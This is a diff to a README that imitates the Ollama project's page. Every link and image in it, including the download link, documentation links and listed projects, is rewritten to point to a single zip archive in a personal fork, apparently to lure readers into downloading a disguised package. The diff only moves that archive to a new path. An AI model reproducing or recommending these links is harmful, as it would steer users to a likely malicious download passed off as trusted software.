@@ -1,13 +1,13 @@
 <div align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" height="200px" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
-    <img alt="logo" height="200px" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
+    <source media="(prefers-color-scheme: dark)" height="200px" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
+    <img alt="logo" height="200px" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
   </picture>
 </div>
 
 # Ollama
 
-[![Discord](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip)](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip)
+[![Discord](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip)](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip)
 
 > Note: Ollama is in early preview. Please report any issues you find.
 
@@ -15,13 +15,13 @@ Run, create, and share large language models (LLMs).
 
 ## Download
 
-- [Download](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) for macOS
+- [Download](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) for macOS
 - Download for Windows and Linux (coming soon)
 - Build [from source](#building)
 
 ## Quickstart
 
-To run and chat with [Llama 2](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip), the new model by Meta:
+To run and chat with [Llama 2](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip), the new model by Meta:
 
 ```
 ollama run llama2
@@ -87,7 +87,7 @@ Hello! It's your friend Mario.
 
 For more examples, see the [examples](./examples) directory.
 
-For more information on creating a Modelfile, see the [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) documentation.
+For more information on creating a Modelfile, see the [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) documentation.
 
 ### Pull a model from the registry
 
@@ -105,11 +105,11 @@ ollama list
 
 ### Overview
 
-Ollama bundles model weights, configuration, and data into a single package, defined by a [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip).
+Ollama bundles model weights, configuration, and data into a single package, defined by a [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip).
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" height="480" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
-  <img alt="logo" height="480" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
+  <source media="(prefers-color-scheme: dark)" height="480" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
+  <img alt="logo" height="480" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
 </picture>
 
 ## Building
@@ -150,7 +150,7 @@ curl -X POST http://localhost:11434/api/create -d '{"name": "my-model", "path": 
 
 ## Projects built with Ollama
 
-- [Continue](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) - embeds Ollama inside Visual Studio Code. The extension lets you highlight code to add to the prompt, ask questions in the sidebar, and generate code inline.
-- [Discord AI Bot](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) - interact with Ollama as a chatbot on Discord.
-- [Raycast Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) - Raycast extension to use Ollama for local llama inference on Raycast.
-- [Simple HTML UI for Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip)
+- [Continue](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) - embeds Ollama inside Visual Studio Code. The extension lets you highlight code to add to the prompt, ask questions in the sidebar, and generate code inline.
+- [Discord AI Bot](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) - interact with Ollama as a chatbot on Discord.
+- [Raycast Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) - Raycast extension to use Ollama for local llama inference on Raycast.
+- [Simple HTML UI for Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip)
